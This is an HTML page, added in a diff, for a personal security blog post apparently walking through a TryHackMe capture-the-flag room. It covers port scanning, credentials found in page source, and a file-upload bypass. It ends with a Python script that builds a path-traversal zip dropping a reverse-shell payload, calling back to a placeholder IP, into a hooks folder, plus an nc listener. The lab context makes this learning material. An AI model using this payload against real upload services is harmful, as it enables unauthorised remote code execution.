@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="ro-ro">
+<head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">The Hollow Shell | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="The Hollow Shell | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="The Hollow Shell | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="The Hollow Shell | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="The Hollow Shell | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/the-hollow-shell/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-09-22T11:22:47Z />
+    <meta property="article:published_time" content=2026-09-22T11:22:47Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/the-hollow-shell/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "The Hollow Shell",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-09-22",
+        "description": "",
+        "wordCount":  286 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-09-22",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/the-hollow-shell/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="The Hollow Shell">
+  <meta property="og:description" content="thm free room
+ncat first scan : wierd service upnp , lets run a bigger scan and research the service in the meanwhile
+ok so its some sort of configuration protocol for larger networks ,
+on the larger scan we got that there is a http server on port 5000 , lets look this up
+and we have a log in page here , cool
+found this in the source code , log in with those creds
+looks like basic file injection
+we have a match a certain file type to inject a file , we will need to try some different approaches to bypass this, lets create a zip by schracth like this :
+then add a name (we will need this later )
+now zip it up
+lets try this one
+and we need to modify it
+just add the square brackets for photo.png
+upload it and we got this address , but this is no use for us , we need to configure some kind of a payload that would give us rce on the machine">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:modified_time" content="2026-09-22T11:22:47+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="The Hollow Shell">
+  <meta name="twitter:description" content="thm free room
+ncat first scan : wierd service upnp , lets run a bigger scan and research the service in the meanwhile
+ok so its some sort of configuration protocol for larger networks ,
+on the larger scan we got that there is a http server on port 5000 , lets look this up
+and we have a log in page here , cool
+found this in the source code , log in with those creds
+looks like basic file injection
+we have a match a certain file type to inject a file , we will need to try some different approaches to bypass this, lets create a zip by schracth like this :
+then add a name (we will need this later )
+now zip it up
+lets try this one
+and we need to modify it
+just add the square brackets for photo.png
+upload it and we got this address , but this is no use for us , we need to configure some kind of a payload that would give us rce on the machine">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/the-hollow-shell/">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
+
+    
+    
+    
+      
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+<body>
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://novaclearnscyber.github.io/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
+
+    <style>
+        .custom-banner {
+            width: 100%;
+
+            height: {
+                    {
+                    .Site.Params.banner_height | default "300px"
+                }
+            }
+
+            ;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (max-width: 768px) {
+            .custom-banner {
+                height: 200px !important;
+                 
+            }
+        }
+    </style>
+
+    
+    <div class="custom-banner">
+        <div
+            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+        </div>
+    </div>
+    
+
+    <div id="content">
+        
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">The Hollow Shell</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-09-22T11:22:47&#43;00:00" itemprop="datePublished"> 22 sept. 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>thm free room<br>
+ncat first scan : <img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922052203.png" alt="">
+<br>
+wierd service upnp , lets run a bigger scan and research the service in the meanwhile<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922052430.png" alt="">
+<br>
+ok so its some sort of configuration protocol for larger networks ,<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922052536.png" alt="">
+<br>
+on the larger scan we got that there is a http server on port 5000 , lets look this up<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922052611.png" alt="">
+<br>
+and we have a log in page here , cool<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922054350.png" alt="">
+<br>
+found this in the source code , log in with those creds<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922054446.png" alt="">
+<br>
+looks like basic file injection<br>
+we have a match a certain file type to inject a file , we will need to try some different approaches to bypass this, lets create a zip by schracth like this :<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922062933.png" alt="">
+<br>
+then add a name (we will need this later )<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922063025.png" alt="">
+<br>
+now zip it up<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922063039.png" alt="">
+<br>
+lets try this one<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922063251.png" alt="">
+<br>
+and we need to modify it<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922063344.png" alt="">
+<br>
+just add the square brackets for photo.png<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260922063435.png" alt="">
+<br>
+upload it and we got this address , but this is no use for us , we need to configure some kind of a payload that would give us rce on the machine</p>
+<p>based on the &ldquo;automation hooks&rdquo; line under the upload button, we can deduce that exist a folder /var/www/hooks where we can run python scripts, so we can craft a script for that</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;YOUR_IP&#34;,YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(<span style="color:#e6db74">&#34;something.zip&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> z :
+</span></span><span style="display:flex;"><span>        z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">&#34;shell.json&#34;</span>, json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;evil&#34;</span>, <span style="color:#e6db74">&#34;assets&#34;</span>: [<span style="color:#e6db74">&#34;photo.png&#34;</span>]}))
+</span></span><span style="display:flex;"><span>        z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">&#34;photo.png&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89</span><span style="color:#e6db74">PNG</span><span style="color:#ae81ff">\r\n\x1a\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">&#34;../../hooks/something.py&#34;</span>, payload)
+</span></span></code></pre></div><p>this script will create an archive name something.zip , that when uploaded will create a rev shell back to you.<br>
+just start a listener with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp YOUR_PORT
+</span></span></code></pre></div><p>then upload the file</p>
+<p>u will be connect to the machine after that , the flag is inside room service home directory</p>
+
+            </div>
+        </article></main>
+</div>
+
+    </div>
+    <footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+</body>
+
+</html>
